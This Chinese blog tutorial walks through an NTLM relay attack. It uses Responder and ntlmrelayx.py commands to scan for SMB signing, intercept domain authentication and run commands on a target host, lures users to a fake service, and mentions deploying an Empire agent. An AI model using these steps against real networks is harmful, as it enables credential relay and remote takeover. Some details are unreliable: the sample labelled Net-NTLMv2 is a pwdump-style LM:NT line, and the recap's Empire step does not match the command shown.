# NtlmRelay-NTLM中继实用指南

## 讲在前面：

这篇博客文章的主要目的是成为一篇NTLM中继实用的指南，以帮助消除有关NTLM中继的任何困惑。我不会详细介绍所有细节，因为不论是国内国外都有大量论文详细说明了攻击的实际工作方式，SANS的[这篇文章](https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python)对于攻击背后的理论是可供深入了解的，[NTLM-Relay的几种玩法](https://blog.csdn.net/whatday/article/details/107698383)

NTLM与NTLMv1 / v2与Net-NTLMv1 / v2

首先从题目来看，我们可能就会困惑，NTLMv1 / v2与Net-NTLMv1 / v2之间有什么不同，他们是什么样的关系，老实说，因为所有关于这种攻击的文章都是关于NTLMv1/v2的，所以在任何地方看到Net-NTLMv1/v2时，很明显，人们会怀疑它是不是同一件事。

NTLMv1/v2是Net-NTLMv1/v2的简写，因此它们是相同的东西。

然而，NTLM的含义完全不同。

NTLM哈希存储在本地安全帐户管理器（SAM）数据库和域控制器的NTDS.dit数据库中。看起来像这样：

```text
aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
```

LM-Hash是在分号_之前_的一个，而NT-Hash是在分号_之后_的一个。从Windows Vista和Windows Server 2008开始，默认情况下，仅存储NT哈希。

Net-NTLM哈希用于网络身份验证（它们来自质询/响应算法，并且基于用户的NT哈希）。以下是Net-NTLMv2（又名NTLMv2）哈希的示例：

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:28553a7f5b14b5e60ba4d7cce9045e3d
```

详细介绍文章：

我们在进行中继之前，先用responder工具包里面的RunFinger.py脚本扫描域内机器的SMB签名的开放情况：

```text
python RunFinger.py -i 10.80.0.10/24
```

![](https://img-blog.csdnimg.cn/20201004023820782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

我们需要修改一下responder的配置文件 Responder.conf，不让其对 hash 进行抓取。将SMB和HTTP的On改为Off

![](https://img-blog.csdnimg.cn/20201004023952330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

启动responder

```text
responder -I 指定网卡
```

![](https://img-blog.csdnimg.cn/202010040243193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

```text
python ntlmrelayx.py -t smb://10.80.0.10 -c whoami -smb2support    *此处举例某个用法，详细用法可以-h查看帮助*
```

![](https://img-blog.csdnimg.cn/20201004024602794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

然后只要使用其他方法诱导域管理员或普通域用户访问攻击机搭建的伪造HTTP或SMB服务，并输入用户名密码

![](https://img-blog.csdnimg.cn/2020100402545568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20201004025538188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

回顾一下：

1. 我们正在使用[Responder](https://github.com/lgandx/Responder)通过多播/广播协议拦截身份验证尝试（Net-NTLM哈希）。
2. 但是，由于我们关闭了[Responder的](https://github.com/lgandx/Responder)SMB和HTTP服务器并运行了[ntlmrelayx.py](https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py)，因此这些身份验证尝试会自动传递到[ntlmrelayx.py的](https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py)SMB和HTTP服务器
3. [ntlmrelayx.py](https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py)接管并将这些哈希转发到我们的目标列表。如果中继成功，它将执行我们的Empire启动程序，并在目标计算机上为我们提供Empire Agent。

